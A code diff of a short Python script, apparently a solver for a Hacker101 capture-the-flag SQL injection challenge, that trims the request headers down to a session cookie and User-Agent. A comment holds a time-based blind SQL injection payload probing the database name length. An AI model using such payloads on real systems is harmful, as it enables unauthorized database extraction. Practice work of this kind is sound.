@@ -1,25 +1,8 @@
 import requests
 import time
 Header={
-    "Host" : "2e9d2acb2d2de4fa7bf7dbe02b2f35df.ctf.hacker101.com",
     "Cookie" : "quizsession=ea6b7d7af855799bfe91e5002fc14319",
-    "Content-Length" : "20",
-    "Cache-Control": "max-age=0",
-    "Sec-Ch-Ua": "",
-    "Sec-Ch-Ua-Mobile": "?0",
-    "Sec-Ch-Ua-Platform": "",
-    "Upgrade-Insecure-Requests": "1",
-    "Origin": "https://2e9d2acb2d2de4fa7bf7dbe02b2f35df.ctf.hacker101.com",
-    "Content-Type": "application/x-www-form-urlencoded",
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
-    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-    "Sec-Fetch-Site": "same-origin",
-    "Sec-Fetch-Mode": "navigate",
-    "Sec-Fetch-User": "?1",
-    "Sec-Fetch-Dest": "document",
-    "Referer": "https://2e9d2acb2d2de4fa7bf7dbe02b2f35df.ctf.hacker101.com/evil-quiz/",
-    "Accept-Encoding": "gzip, deflate",
-    "Accept-Language": "zh-CN,zh;q=0.9"
 }
 #1' or length(database())>4 and sleep(0.5)#
 def get_database_length():
